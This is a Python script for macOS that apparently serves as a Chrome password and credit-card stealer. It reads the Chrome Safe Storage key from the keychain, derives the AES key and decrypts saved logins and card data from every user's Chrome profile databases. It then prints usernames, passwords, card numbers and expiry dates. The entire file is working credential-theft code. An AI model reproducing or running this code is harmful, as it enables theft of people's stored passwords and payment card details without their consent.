import sqlite3
import binascii
import subprocess
import base64
import operator
import tempfile
import shutil
import glob
import hmac
import struct
import itertools


def pbkdf2_bin(hash_fxn, password, salt, iterations, keylen=16):
    # https://github.com/mitsuhiko/python-pbkdf2
    _pack_int = struct.Struct('>I').pack
    hashfunc = sha1
    mac = hmac.new(password, None, hashfunc)

    def _pseudorandom(x, mac=mac):
        h = mac.copy()
        h.update(x)
        return map(ord, h.digest())
    buf = []
    for block in xrange(1, -(-keylen // mac.digest_size) + 1):
        rv = u = _pseudorandom(salt + _pack_int(block))
        for i in xrange(iterations - 1):
            u = _pseudorandom("".join(map(chr, u)))
            rv = itertools.starmap(operator.xor, itertools.izip(rv, u))
        buf.extend(rv)
    return "".join(map(chr, buf))[:keylen]

try:
    from hashlib import pbkdf2_hmac
except ImportError:
    pbkdf2_hmac = pbkdf2_bin
    from hashlib import sha1

login_data_path = '/Users/*/Library/Application Support/Google/Chrome/*/Login Data'
cc_data_path = '/Users/*/Library/Application Support/Google/Chrome/*/Web Data'
chrome_data = glob.glob(login_data_path) + glob.glob(cc_data_path)
safe_storage_key = subprocess.Popen("security find-generic-password -wa 'Chrome'", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

if safe_storage_key.wait() != 0:
    print "Error getting Chrome safe storage key."

    if safe_storage_key.wait() == 51:
        print "Error: user clicked deny"
    elif safe_storage_key.wait() == 44:
        print "Error: Chrome entry not found in keychain."
    else:
        print safe_storage_key.stderr.read()
    exit()
else:
    safe_storage_key = safe_storage_key.stdout.read().replace('\n', '')


def get_cc_issuer(cc_num):
    cc_dict = {3: "AMEX", 4: "Visa", 5: "Mastercard", 6: "Discover"}
    try:
        return cc_dict[cc_num[0]]
    except KeyError:
        return "Error: unknown card issuer."


def chrome_decrypt(encrypted, iv, key):
    # AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
    hex_key = binascii.hexlify(key)
    hex_enc_password = base64.b64encode(encrypted[3:])
    try:
        decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hex_key, hex_enc_password), shell=True)
    except Exception:
        decrypted = "Error retrieving password."
    return decrypted


def chrome_process(safe_storage_key, chrome_data):
    # Salt, iterations, iv, size -> https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
    iv = "".join(("20",) * 16)
    key = pbkdf2_hmac("sha1", safe_storage_key, b"saltysalt", 1003)[:16]
    copy_path = tempfile.mkdtemp()  # Work around for locking DB

    with open(chrome_data, "r") as content:
        dbcopy = content.read()
    with open("{0}/chrome".format(copy_path), "w") as content:
        # If Chrome is open the DB will be locked, get around this by making a temp copy.
        content.write(dbcopy)

    database = sqlite3.connect("{0}/chrome".format(copy_path))

    if "Web Data" in chrome_data:
        sql_query = "select name_on_card, card_number_encrypted, expiration_month, expiration_year from credit_cards"
    else:
        sql_query = "select username_value, password_value, origin_url, submit_element from logins"

    decrypted_list = []
    with database:
        for values in database.execute(sql_query):
            if values[0] == '' or (values[1][:3] != b"v10"):
                # User will be empty if they have selected "never" store password.
                continue
            else:
                decrypted_list.append((str(values[2]).encode("ascii", "ignore"), values[0].encode("ascii", "ignore"), str(chrome_decrypt(values[1], iv, key)).encode("ascii", "ignore"), values[3]))
    shutil.rmtree(copy_path)
    return decrypted_list


def print_passwords():
    for profile in chrome_data:
        for i, x in enumerate(chrome_process(safe_storage_key, str(profile))):
            if "Web Data" in profile:
                if i == 0:
                    print "Credit Cards for Chrome Profile -> [{0}]".format(profile.split('/')[-2])
                print "   [{0}] {1}".format((i + 1), get_cc_issuer(x[2]))
                print "\tCard Name: {0}".format(x[1])
                print "\tCard Number: {0}".format(x[2])
                print "\tExpiration Date: {0}/{1}".format(x[0], x[3])
            else:
                if i == 0:
                    print "Passwords for Chrome Profile -> [{0}]".format(profile.split('/')[-2])
                print "   [{0}] {1}".format((i + 1), x[0])
                print "\tUsername: {0}".format(x[1])
                print "\tPassword: {0}".format(x[2])


if __name__ == '__main__':
    print_passwords()
